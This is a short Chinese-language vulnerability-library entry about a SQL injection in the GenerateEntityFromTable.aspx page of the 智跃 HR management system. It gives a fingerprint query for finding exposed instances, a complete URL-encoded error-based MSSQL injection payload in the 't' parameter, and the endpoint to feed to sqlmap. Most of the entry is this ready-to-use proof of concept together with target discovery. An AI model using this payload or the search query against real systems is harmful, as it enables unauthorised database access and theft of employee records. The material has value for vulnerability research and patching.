---
fofa: "web.body="
source: "wy876 漏洞文库"
---

# 智跃人力资源管理系统 GenerateEntityFromTable.aspx SQL注入漏洞

# 一、漏洞简介
智跃人力资源管理系统是基于B/S网页端广域网平台，一套考勤系统即可对全国各地多个分公司进行统一管控，成本更低。信息共享更快。跨平台，跨电子设备。智跃人力资源管理系统 GenerateEntityFromTable.aspx SQL注入漏洞，攻击者可通过该漏洞获取数据库权限。

# 二、影响版本
+ 智跃人力资源管理系统

# 三、资产测绘
+ hunter`web.body="ZY.LOGO.64.png"`
+ 特征


# 四、漏洞复现
```plain
/resource/utils/GenerateEntityFromTable.aspx?t=1%27%2B(SELECT%20CHAR(103)%2BCHAR(87)%2BCHAR(114)%2BCHAR(112)%20WHERE%201669%3D1669%20AND%206492%20IN%20(select%20SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES(%27MD5%27,%271230%27)),3,32)))%2B%27
```


sqlmap

```plain
/resource/utils/GenerateEntityFromTable.aspx?t=1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zwvy0quhfwnddcae>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
